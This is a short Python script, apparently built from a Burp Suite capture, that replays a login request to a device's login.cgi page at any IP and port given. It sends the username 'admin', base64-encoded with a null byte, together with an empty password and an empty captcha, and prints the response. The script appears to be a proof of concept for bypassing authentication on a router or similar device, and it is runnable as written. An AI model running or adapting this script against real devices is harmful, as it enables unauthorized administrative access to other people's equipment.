import argparse
import requests

def replay_login(ip, port):
    burp0_url = f"http://{ip}:{port}/login.cgi"
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": f"http://{ip}:{port}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"http://{ip}:{port}/",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    burp0_data = {
        "html_response_page": "login.asp",
        "login_name": "YWRtaW4A",
        "login_pass": '',
        "graph_id": "66edb",
        "alert_id": "0",
        "log_pass": '',
        "graph_code": '',
        "login": "Log In"
    }
    response = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replay login script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, help='Target port')
    args = parser.parse_args()
    replay_login(args.ip, args.port)
